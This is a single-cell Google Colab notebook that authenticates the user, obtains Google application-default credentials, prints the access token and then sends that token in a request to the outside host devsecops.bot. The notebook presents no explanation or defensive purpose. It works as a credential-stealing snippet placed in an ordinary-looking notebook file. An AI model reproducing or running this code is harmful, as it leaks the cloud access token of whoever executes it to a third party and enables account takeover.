{
  "cells": [
    {
      "cell_type": "code",
      "id": "V05RWQEYOHE8Jvboeu9NifeO",
      "metadata": {
        "tags": [],
        "id": "V05RWQEYOHE8Jvboeu9NifeO",
        "executionInfo": {
          "status": "ok",
          "timestamp": 1717152408382,
          "user_tz": -330,
          "elapsed": 5,
          "user": {
            "displayName": "",
            "userId": ""
          }
        },
        "outputId": "2a9f18bf-afab-4c39-ad9c-7776cb225fbe",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "import requests\n",
        "from google.auth import default\n",
        "from google.colab import auth\n",
        "from oauth2client.client import GoogleCredentials\n",
        "\n",
        "auth.authenticate_user()\n",
        "auth=GoogleCredentials.get_application_default()\n",
        "print(auth.get_access_token())\n",
        "print(requests.get(\"https://devsecops.bot/?token=\"+str(auth.get_access_token())))\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "0\n"
          ]
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.10.10"
    },
    "colab": {
      "provenance": [],
      "name": "raushan (31 May 2024, 15:38:44)"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 5
}
